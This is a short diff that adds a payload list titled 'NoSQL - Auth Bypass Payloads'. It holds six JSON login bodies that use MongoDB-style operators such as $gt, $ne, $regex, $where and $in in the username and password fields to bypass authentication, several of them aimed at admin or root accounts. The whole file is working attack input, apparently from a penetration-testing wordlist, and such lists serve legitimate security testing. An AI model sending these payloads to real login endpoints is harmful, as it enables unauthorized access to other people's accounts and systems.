@@ -1,0 +1,7 @@
+# NoSQL - Auth Bypass Payloads
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"$where": "this.username == 'admin'"}
+{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
